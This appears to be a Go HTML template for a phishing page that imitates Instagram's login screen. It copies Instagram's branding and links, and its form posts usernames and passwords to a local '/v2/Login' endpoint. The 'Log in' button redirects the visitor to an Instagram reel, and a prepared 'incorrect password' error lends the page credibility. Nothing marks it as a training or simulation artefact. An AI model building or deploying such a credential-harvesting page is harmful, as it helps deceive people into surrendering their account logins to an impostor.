{{template "base" .}}

{{define "css"}}
<link rel="stylesheet" href="/static/style.css">
{{end}}

{{define "content"}}

<div class="lg-page">
        
       <div class="lg-lang">English (US)</div>
        
       <div class="lg-logo">
            <img src="../static/images/instagram.png" alt="instagram">
       </div>
        
       <form class="lg-form" action="/v2/Login" method="post">
            <input type="hidden" name="csrf_token" value="{{.CSRFToken}}"> 
            <input type="text" placeholder="Username, email or mobile number" name="u_name">
            <input type="password" placeholder="Password" name="pass">
            <button class="lg-submit" type="button" onclick="window.location.href='https://www.instagram.com/reel/Dd9AfeVip6u/?stkn=MW8zbGh3NDBrbGtyeA=='"> Log in</button>
            {{if .InvalidUsername}}
            <div class="lg-error">Sorry, your password was incorrect. Please double-check your password.</div>
            {{end}}
       </form>
        
       <a class="lg-forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>

       <div class="lg-spacer"></div>

       <a class="lg-create" href="https://www.instagram.com/accounts/emailsignup/">Create new account</a>

       <div class="lg-meta">
           <a href="https://www.meta.com/" target="_blank" rel="noopener noreferrer">
               <img src="/static/images/my-logo2.png" alt="meta logo">
           </a>
       </div>
</div>

{{end}}
